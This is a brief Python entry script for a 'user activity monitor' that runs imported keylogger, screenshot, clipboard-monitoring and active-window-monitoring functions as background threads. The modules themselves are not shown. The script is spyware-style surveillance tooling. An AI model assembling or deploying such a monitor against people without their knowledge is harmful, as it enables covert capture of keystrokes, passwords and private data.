import threading
import time

from keylogger import start_keylogger
from screenshot import capture_screenshot
from clipboard_monitor import monitor_clipboard
from window_monitor import monitor_active_window


def main():

    print("\n==============================")
    print(" USER ACTIVITY MONITOR STARTED ")
    print("==============================\n")

    print("Press CTRL + C to stop the program.\n")

    t1 = threading.Thread(target=start_keylogger, daemon=True)
    t2 = threading.Thread(target=capture_screenshot, daemon=True)
    t3 = threading.Thread(target=monitor_clipboard, daemon=True)
    t4 = threading.Thread(target=monitor_active_window, daemon=True)

    t1.start()
    t2.start()
    t3.start()
    t4.start()

    try:
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[INFO] Program stopped by user.")
        print("[INFO] Monitoring ended safely.")


if __name__ == "__main__":
    main()